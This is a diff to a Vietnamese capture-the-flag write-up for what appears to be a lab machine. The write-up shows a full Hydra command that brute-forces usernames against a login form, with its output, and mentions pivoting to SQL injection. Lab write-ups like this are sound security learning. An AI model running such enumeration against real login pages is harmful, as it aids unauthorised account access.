@@ -39,7 +39,9 @@ Sau một vài thao tác với trang web, ta có 1 vài nhận xét:
 - Có thể có lỗ hỏng SQLi
 
     ??? tip "Hint"
-    ![](image-1.png)
+        ![](image-1.png)
+
+Dựa vào nhận xét một, ta có 1 thủ thuật Brute Force username nho nhỏ bằng Hydra như bên dưới
 
 ```ps1 title="Hydra Brute force"
 └─$ hydra -L $PASS_WORD -p a 10.10.235.161 http-post-form "/index.php:username=^USER^&password=^PASS^:F=Invalid username and password."             
@@ -73,7 +75,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-02 14:21:
 [STATUS] 652.20 tries/min, 9783 tries in 00:15h, 8285672 to do in 211:45h, 16 active
 ```
 
-Như hình trên, ta đã tìm được rất nhiều username (còn nhiều hơn thế nữa,...) và thông báo lỗi sẽ là "Invalid password.". Tôi có brute force password 1 user thì thấy việc tìm luôn cả password là điều không khả thi, có thể challenge này chuyên về SQLi khi có username. Wow, và tôi đã thử và có flag như hình bên dưới.
+Như hình trên, ta đã tìm được rất nhiều username (còn nhiều hơn thế nữa,...) và thông báo lỗi sẽ là "Invalid password.". Tôi có brute force password 1 user (bất kì) thì thấy việc tìm luôn cả password là điều không khả thi, có thể challenge này chuyên về SQLi khi có username. Wow, và tôi đã thử và có flag như hình bên dưới.
 
 ![](image.png)
 
